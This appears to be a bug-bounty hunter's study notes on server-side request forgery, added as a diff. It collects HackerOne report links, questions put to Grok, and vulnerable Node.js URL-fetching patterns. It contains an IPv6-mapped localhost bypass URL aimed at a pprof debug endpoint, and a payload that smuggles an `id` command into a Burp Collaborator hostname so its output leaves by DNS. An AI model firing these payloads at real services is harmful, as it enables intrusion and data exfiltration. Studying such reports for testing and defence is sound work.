@@ -1,0 +1,69 @@
+Learn ssrf
+https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/41642
+
+https://hackerone.com/reports/3165242
+https://hackerone.com/reports/826361
+
+Grok
+https://grok.com/share/bGVnYWN5LWNvcHk_0ddb0c75-776f-437d-998b-17cfd3642da4
+
+Best bypass medium writeup 
+https://medium.com/@Aacle/server-side-request-forgery-ssrf-from-ping-to-rce-6ac95bf4e489
+
+HackerOne reports ssrf to info disclosure (AWS or local information)
+
+https://hackerone.com/reports/2301565
+https://hackerone.com/reports/508459
+https://hackerone.com/reports/301924
+https://hackerone.com/reports/643278
+
+https://hackerone.com/reports/2932960
+https://hackerone.com/reports/1886954
+https://hackerone.com/reports/2262382
+
+https://hackerone.com/reports/2262382
+
+https://dashboard.omise.co/test/webhooks
+https://hackerone.com/reports/341876
+https://hackerone.com/reports/776017
+https://hackerone.com/reports/1086206
+
+On Google 
+https://bughunters.google.com/reports/vrp/waq3msrfu/report
+
+New bypass 
+http://[::ffff:7f00:1]:5000/debug/pprof/heap?debug=1
+
+
+
+Understanding ssrf with grok 
+
+Webhooks & Integrations endpoints which functions mostly use by devposers for different backend servers (nodejs,php etc)
+
+
+In all functions you shared with us which functions is 100% vulnerable for any type of ssrf(reading internal services,Cloud Metadata,file read or rce via DNS Exfiltration)
+
+
+Send most common functions that use by most of developers and it vulnerable to any type of ssrf
+
+In this report hunter can escalate this to rce? Via `id` payloads or also able to see etc pass files ? I ask this because i want to understand in which functions we can achieve rce,file read,metadata etc also have any one functions there we can achieve all types ssrf. So pls explain this in simple you guess vulnerable function was something like. So it can be vulnerable to rce or file read with this functionality?
+
+I notice if we in url parameter we add our burp collaborator url for testing ssrf in in burp collaborator we see dns callback not http callback. So for this what type of function uses by developers most of time? 
+
+http://`id`.4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net
+
+when developers implement "webhook testing", "custom callback URLs", "outgoing notification URLs", "URL preview/fetch", or "send to user-provided endpoint" features. They become vulnerable because user-controlled input (from webhook config, payload, or form) is passed directly to an HTTP client without validation
+
+// Most vulnerable pattern #1
+const url = req.body.webhook_url || req.query.url || event.data.callback_url;  // ← attacker controls
+await fetch(url, { method: 'POST', body: JSON.stringify(payload) });   // or axios.get/post(url)
+
+// Most vulnerable pattern #2
+const response = await axios.post(req.body.targetUrl, data);   // axios is very popular
+
+// Other common vulnerable calls
+http.get(userUrl, callback);                  // built-in http/https module
+https.request({ url: userProvidedUrl }); 
+got(userUrl);                                 // got library
+request(userUrl);                             // old 'request' library (still seen)
+node-fetch(userUrl); 
